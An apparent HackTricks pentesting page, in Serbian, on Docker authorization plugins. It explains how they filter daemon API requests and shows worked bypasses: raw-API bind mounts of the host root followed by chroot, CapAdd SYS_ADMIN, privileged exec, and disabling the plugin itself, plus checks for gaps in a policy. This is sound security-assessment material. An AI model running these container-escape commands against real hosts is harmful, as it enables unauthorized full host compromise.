# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Runtime authorization plugins su dodatni sloj policy-ja koji odlučuje da li caller sme da izvrši određenu daemon radnju. Docker je klasičan primer. Podrazumevano, svako ko može da komunicira sa Docker daemon-om praktično ima široku kontrolu nad njim. Authorization plugins pokušavaju da suze taj model ispitivanjem identiteta autentifikovanog korisnika i zahtevanе API operacije, a zatim dozvoljavaju ili odbijaju zahtev u skladu sa policy-jem.

Ova tema zaslužuje sopstvenu stranicu jer menja exploitation model kada attacker već ima pristup Docker API-ju ili korisniku u `docker` grupi. U takvim okruženjima pitanje više nije samo "da li mogu da pristupim daemon-u?", već i "da li je daemon zaštićen authorization slojem i, ako jeste, da li se taj sloj može zaobići preko neobrađenih endpoint-a, slabog JSON parsiranja ili permissions-a za upravljanje plugin-ima?"

## Operacija

Kada zahtev stigne do Docker daemon-a, authorization subsystem može proslediti kontekst zahteva jednom ili više instaliranih plugin-a. Plugin vidi identitet autentifikovanog korisnika, detalje zahteva, odabrane headere i delove body-ja zahteva ili response-a kada je content type odgovarajući. Više plugin-a može biti ulančano, a pristup se odobrava samo ako svi plugin-i dozvole zahtev.

Ovaj model deluje snažno, ali njegova bezbednost u potpunosti zavisi od toga koliko je autor policy-ja dobro razumeo API. Plugin koji blokira `docker run --privileged`, ali ignoriše `docker exec`, propušta alternativne JSON ključeve kao što je `Binds` na top-level-u ili dozvoljava administraciju plugin-a može stvoriti lažan osećaj ograničenja, a da i dalje ostavi otvorene direktne privilege-escalation putanje.

## Uobičajene mete plugin-a

Važne oblasti za policy review su:

- endpoint-i za kreiranje container-a
- polja u `HostConfig` kao što su `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` i opcije za deljenje namespace-a
- ponašanje `docker exec` komande
- endpoint-i za upravljanje plugin-ima
- bilo koji endpoint koji može indirektno pokrenuti runtime radnje izvan predviđenog policy modela

Istorijski gledano, primeri kao što su Twistlock-ov `authz` plugin i jednostavni edukativni plugin-i kao što je `authobot` učinili su ovaj model lakim za proučavanje, jer su njihovi policy fajlovi i code path-ovi pokazivali kako je mapiranje endpoint-a na radnje zaista implementirano. Za assessment je važna lekcija da autor policy-ja mora da razume kompletnu API površinu, a ne samo najvidljivije CLI komande.

## Abuse

Prvi cilj je saznati šta je zaista blokirano. Ako daemon odbije neku radnju, greška često leak-uje ime plugin-a, što pomaže u identifikaciji korišćene kontrole:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Ako vam je potrebno šire profilisanje endpointa, alati kao što je `docker_auth_profiler` korisni su jer automatizuju inače repetitivan zadatak provere koje API rute i JSON strukture plugin zaista dozvoljava.

Ako okruženje koristi prilagođeni plugin i možete da komunicirate sa API-jem, navedite koja polja objekata se zaista filtriraju:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Ove provere su važne zato što su mnogi neuspesi autorizacije specifični za polje, a ne za koncept. Plugin može odbiti CLI obrazac, a da pritom u potpunosti ne blokira ekvivalentnu API strukturu.

### Potpuni primer: `docker exec` dodaje privilegije nakon kreiranja kontejnera

Politika koja blokira kreiranje privileged kontejnera, ali dozvoljava kreiranje unconfined kontejnera uz `docker exec`, i dalje može biti zaobiđena:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Ako daemon prihvati drugi korak, korisnik je povratio privilegovani interaktivni proces unutar containera za koji je autor policy-ja verovao da je ograničen.

### Full Example: Bind Mount Through Raw API

Neke neispravne policy-je proveravaju samo jedan JSON oblik. Ako bind mount root filesystema nije dosledno blokiran, host se i dalje može mountovati:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ista ideja se može pojaviti i u okviru `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Uticaj je potpuno bekstvo iz host filesystem-a. Zanimljiv detalj je to što bypass potiče od nepotpune pokrivenosti policy-ja, a ne od greške u kernelu.

### Potpun primer: Neprovereni capability atribut

Ako policy zaboravi da filtrira atribut povezan sa capability-jima, attacker može da kreira container koji ponovo dobija opasan capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Kada je prisutan `CAP_SYS_ADMIN` ili slična moćna capability, mnoge breakout tehnike opisane u [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md) postaju dostupne.

### Potpun primer: Onemogućavanje plugina

Ako su operacije upravljanja pluginima dozvoljene, najčistiji bypass može biti potpuno isključivanje kontrole:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Ovo je greška u politici na nivou control-plane-a. Sloj authorization postoji, ali korisnik čija je aktivnost trebalo da bude ograničena i dalje ima dozvolu da ga onemogući.

## Provere

Ove komande služe za utvrđivanje toga da li sloj politike postoji i da li deluje potpun ili površan.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Šta je ovde zanimljivo:

- Poruke o zabrani koje sadrže naziv plugin-a potvrđuju postojanje authorization sloja i često otkrivaju tačnu implementaciju.
- Lista plugin-a vidljiva napadaču može biti dovoljna da otkrije da li su operacije disable ili reconfigure moguće.
- Policy koja blokira samo očigledne CLI akcije, ali ne i raw API zahteve, treba smatrati zaobiđivom dok se ne dokaže suprotno.

## Podrazumevane vrednosti runtime-a

| Runtime / platforma | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Nije podrazumevano omogućen | Pristup daemon-u je praktično all-or-nothing, osim ako nije konfigurisan authorization plugin | nepotpuna plugin policy, blacklists umesto allowlists, omogućavanje upravljanja plugin-ima, slepe tačke na nivou polja |
| Podman | Nema uobičajeni direktni ekvivalent | Podman se obično više oslanja na Unix permissions, rootless izvršavanje i odluke o izlaganju API-ja nego na Docker-style authz plugin-e | široko izlaganje rootful Podman API-ja, slabe permissions socket-a |
| containerd / CRI-O | Drugačiji control model | Ovi runtime-i se obično oslanjaju na permissions socket-a, granice poverenja na node-u i kontrole orchestrator-a na višem nivou, a ne na Docker authz plugin-e | mountovanje socket-a u workload-e, slabe lokalne pretpostavke o poverenju u node |
| Kubernetes | Koristi authn/authz na nivoima API server-a i kubelet-a, a ne Docker authz plugin-e | Cluster RBAC i admission controls su glavni policy sloj | preširok RBAC, slaba admission policy, direktno izlaganje kubelet ili runtime API-ja |

{{#include ../../../banners/hacktricks-training.md}}
